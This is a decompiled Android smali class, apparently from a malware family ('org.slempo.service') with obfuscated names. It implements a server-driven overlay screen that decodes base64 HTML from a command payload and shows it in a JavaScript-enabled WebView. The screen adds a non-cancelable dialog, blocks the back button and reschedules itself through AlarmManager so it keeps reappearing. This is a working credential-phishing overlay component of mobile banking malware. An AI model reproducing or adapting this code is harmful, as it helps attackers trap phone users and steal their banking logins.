.class public Lorg/slempo/service/activities/reuincwoiedlks;
.super Landroid/app/Activity;
.source "reuincwoiedlks.java"


# static fields
.field public static final ACTION:Ljava/lang/String; = "com.slempo.service.activities.HTMLStart"

.field public static webAppInterface:Lorg/slempo/service/reiojdmciworj;


# instance fields
.field private am:Landroid/app/AlarmManager;

.field private correlationId:I

.field private dialog1Text:Ljava/lang/String;

.field private html:Ljava/lang/String;

.field private isWebViewLoaded:Z

.field private layout:Landroid/widget/FrameLayout;

.field private restartTimeMinutes:I

.field private webView:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 27
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 39
    const/4 v0, 0x1

    iput v0, p0, Lorg/slempo/service/activities/reuincwoiedlks;->restartTimeMinutes:I

    .line 27
    return-void
.end method

.method static synthetic access$0(Lorg/slempo/service/activities/reuincwoiedlks;)V
    .locals 0

    .prologue
    .line 106
    invoke-direct {p0}, Lorg/slempo/service/activities/reuincwoiedlks;->showWebView()V

    return-void
.end method

.method static synthetic access$1(Lorg/slempo/service/activities/reuincwoiedlks;)V
    .locals 0

    .prologue
    .line 110
    invoke-direct {p0}, Lorg/slempo/service/activities/reuincwoiedlks;->scheduleLaunch()V

    return-void
.end method

.method private scheduleLaunch()V
    .locals 7

    .prologue
    const/4 v6, 0x0

    .line 111
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 112
    .local v0, "cal":Ljava/util/Calendar;
    const/16 v3, 0xc

    iget v4, p0, Lorg/slempo/service/activities/reuincwoiedlks;->restartTimeMinutes:I

    invoke-virtual {v0, v3, v4}, Ljava/util/Calendar;->add(II)V

    .line 113
    new-instance v1, Landroid/content/Intent;

    const-string v3, "com.slempo.service.activities.HTMLStart"

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 114
    .local v1, "intent":Landroid/content/Intent;
    const-string v3, "values"

    invoke-virtual {p0}, Lorg/slempo/service/activities/reuincwoiedlks;->getIntent()Landroid/content/Intent;

    move-result-object v4

    const-string v5, "values"

    invoke-virtual {v4, v5}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 115
    invoke-static {p0, v6, v1, v6}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 116
    .local v2, "pi":Landroid/app/PendingIntent;
    iget-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->am:Landroid/app/AlarmManager;

    invoke-virtual {v0}, Ljava/util/Calendar;->getTimeInMillis()J

    move-result-wide v4

    invoke-virtual {v3, v6, v4, v5, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 117
    return-void
.end method

.method private showFirstDialog()V
    .locals 4

    .prologue
    .line 86
    new-instance v0, Landroid/app/AlertDialog$Builder;

    invoke-direct {v0, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 87
    .local v0, "builder":Landroid/app/AlertDialog$Builder;
    iget-object v2, p0, Lorg/slempo/service/activities/reuincwoiedlks;->dialog1Text:Ljava/lang/String;

    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 88
    const v2, 0x7f0b002b

    .line 89
    new-instance v3, Lorg/slempo/service/activities/reuincwoiedlks$1;

    invoke-direct {v3, p0}, Lorg/slempo/service/activities/reuincwoiedlks$1;-><init>(Lorg/slempo/service/activities/reuincwoiedlks;)V

    .line 88
    invoke-virtual {v0, v2, v3}, Landroid/app/AlertDialog$Builder;->setPositiveButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 94
    const v2, 0x7f0b0030

    .line 95
    new-instance v3, Lorg/slempo/service/activities/reuincwoiedlks$2;

    invoke-direct {v3, p0}, Lorg/slempo/service/activities/reuincwoiedlks$2;-><init>(Lorg/slempo/service/activities/reuincwoiedlks;)V

    .line 94
    invoke-virtual {v0, v2, v3}, Landroid/app/AlertDialog$Builder;->setNegativeButton(ILandroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 101
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    move-result-object v1

    .line 102
    .local v1, "dialog":Landroid/app/AlertDialog;
    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog;->setCancelable(Z)V

    .line 103
    invoke-virtual {v1}, Landroid/app/AlertDialog;->show()V

    .line 104
    return-void
.end method

.method private showWebView()V
    .locals 2

    .prologue
    .line 107
    iget-object v0, p0, Lorg/slempo/service/activities/reuincwoiedlks;->layout:Landroid/widget/FrameLayout;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/widget/FrameLayout;->setVisibility(I)V

    .line 108
    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    .prologue
    .line 129
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 5
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "SetJavaScriptEnabled"
        }
    .end annotation

    .prologue
    const/4 v3, 0x0

    .line 52
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 53
    iput-boolean v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->isWebViewLoaded:Z

    .line 54
    if-nez p1, :cond_0

    .line 55
    const-string v3, "alarm"

    invoke-virtual {p0, v3}, Lorg/slempo/service/activities/reuincwoiedlks;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/AlarmManager;

    iput-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->am:Landroid/app/AlarmManager;

    .line 57
    const v3, 0x7f03001f

    :try_start_0
    invoke-virtual {p0, v3}, Lorg/slempo/service/activities/reuincwoiedlks;->setContentView(I)V

    .line 58
    const v3, 0x7f0a0065

    invoke-virtual {p0, v3}, Lorg/slempo/service/activities/reuincwoiedlks;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/FrameLayout;

    iput-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->layout:Landroid/widget/FrameLayout;

    .line 59
    new-instance v2, Lorg/json/JSONObject;

    invoke-virtual {p0}, Lorg/slempo/service/activities/reuincwoiedlks;->getIntent()Landroid/content/Intent;

    move-result-object v3

    const-string v4, "values"

    invoke-virtual {v3, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 60
    .local v2, "json":Lorg/json/JSONObject;
    const-string v3, "html"

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v3, v4}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v0

    .line 62
    .local v0, "data":[B
    :try_start_1
    new-instance v3, Ljava/lang/String;

    const-string v4, "UTF-8"

    invoke-direct {v3, v0, v4}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    iput-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->html:Ljava/lang/String;
    :try_end_1
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    .line 66
    :goto_0
    :try_start_2
    const-string v3, "restart interval minutes"

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v3

    iput v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->restartTimeMinutes:I

    .line 67
    const-string v3, "correlation id"

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v3

    iput v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->correlationId:I

    .line 68
    const-string v3, "first dialog"

    invoke-virtual {v2, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->dialog1Text:Ljava/lang/String;

    .line 69
    new-instance v3, Lorg/slempo/service/reiojdmciworj;

    iget v4, p0, Lorg/slempo/service/activities/reuincwoiedlks;->correlationId:I

    invoke-direct {v3, p0, v4}, Lorg/slempo/service/reiojdmciworj;-><init>(Landroid/app/Activity;I)V

    sput-object v3, Lorg/slempo/service/activities/reuincwoiedlks;->webAppInterface:Lorg/slempo/service/reiojdmciworj;

    .line 70
    const v3, 0x7f0a0066

    invoke-virtual {p0, v3}, Lorg/slempo/service/activities/reuincwoiedlks;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/webkit/WebView;

    iput-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->webView:Landroid/webkit/WebView;

    .line 71
    iget-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->webView:Landroid/webkit/WebView;

    new-instance v4, Lorg/slempo/service/ewidojcmwoiej;

    invoke-direct {v4}, Lorg/slempo/service/ewidojcmwoiej;-><init>()V

    invoke-virtual {v3, v4}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    .line 72
    iget-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->webView:Landroid/webkit/WebView;

    const/high16 v4, 0x2000000

    invoke-virtual {v3, v4}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    .line 73
    iget-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->webView:Landroid/webkit/WebView;

    invoke-virtual {v3}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    const/4 v4, 0x1

    invoke-virtual {v3, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 74
    iget-object v3, p0, Lorg/slempo/service/activities/reuincwoiedlks;->dialog1Text:Ljava/lang/String;

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_1

    .line 75
    invoke-direct {p0}, Lorg/slempo/service/activities/reuincwoiedlks;->showFirstDialog()V

    .line 83
    .end local v0    # "data":[B
    .end local v2    # "json":Lorg/json/JSONObject;
    :cond_0
    :goto_1
    return-void

    .line 63
    .restart local v0    # "data":[B
    .restart local v2    # "json":Lorg/json/JSONObject;
    :catch_0
    move-exception v1

    .line 64
    .local v1, "e":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v1}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_0

    .line 79
    .end local v0    # "data":[B
    .end local v1    # "e":Ljava/io/UnsupportedEncodingException;
    .end local v2    # "json":Lorg/json/JSONObject;
    :catch_1
    move-exception v1

    .line 80
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_1

    .line 77
    .end local v1    # "e":Lorg/json/JSONException;
    .restart local v0    # "data":[B
    .restart local v2    # "json":Lorg/json/JSONObject;
    :cond_1
    :try_start_3
    invoke-direct {p0}, Lorg/slempo/service/activities/reuincwoiedlks;->showWebView()V
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1
    .param p1, "keyCode"    # I
    .param p2, "event"    # Landroid/view/KeyEvent;

    .prologue
    .line 121
    const/4 v0, 0x4

    if-ne p1, v0, :cond_0

    .line 122
    const/4 v0, 0x1

    .line 124
    :goto_0
    return v0

    :cond_0
    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    goto :goto_0
.end method

.method protected onPause()V
    .locals 0

    .prologue
    .line 133
    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    .line 134
    return-void
.end method

.method protected onRestoreInstanceState(Landroid/os/Bundle;)V
    .locals 1
    .param p1, "paramBundle"    # Landroid/os/Bundle;

    .prologue
    .line 152
    invoke-super {p0, p1}, Landroid/app/Activity;->onRestoreInstanceState(Landroid/os/Bundle;)V

    .line 153
    iget-object v0, p0, Lorg/slempo/service/activities/reuincwoiedlks;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->restoreState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    .line 154
    return-void
.end method

.method protected onResume()V
    .locals 0

    .prologue
    .line 138
    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    .line 139
    return-void
.end method

.method protected onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 1
    .param p1, "paramBundle"    # Landroid/os/Bundle;

    .prologue
    .line 157
    invoke-super {p0, p1}, Landroid/app/Activity;->onSaveInstanceState(Landroid/os/Bundle;)V

    .line 158
    iget-object v0, p0, Lorg/slempo/service/activities/reuincwoiedlks;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->saveState(Landroid/os/Bundle;)Landroid/webkit/WebBackForwardList;

    .line 159
    return-void
.end method

.method protected onStart()V
    .locals 6

    .prologue
    const/4 v1, 0x0

    .line 142
    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    .line 143
    iget-boolean v0, p0, Lorg/slempo/service/activities/reuincwoiedlks;->isWebViewLoaded:Z

    if-nez v0, :cond_0

    .line 144
    const/4 v0, 0x1

    iput-boolean v0, p0, Lorg/slempo/service/activities/reuincwoiedlks;->isWebViewLoaded:Z

    .line 145
    const-string v3, "text/html"

    .line 146
    .local v3, "mime":Ljava/lang/String;
    const-string v4, "utf-8"

    .line 147
    .local v4, "encoding":Ljava/lang/String;
    iget-object v0, p0, Lorg/slempo/service/activities/reuincwoiedlks;->webView:Landroid/webkit/WebView;

    iget-object v2, p0, Lorg/slempo/service/activities/reuincwoiedlks;->html:Ljava/lang/String;

    move-object v5, v1

    invoke-virtual/range {v0 .. v5}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 149
    .end local v3    # "mime":Ljava/lang/String;
    .end local v4    # "encoding":Ljava/lang/String;
    :cond_0
    return-void
.end method
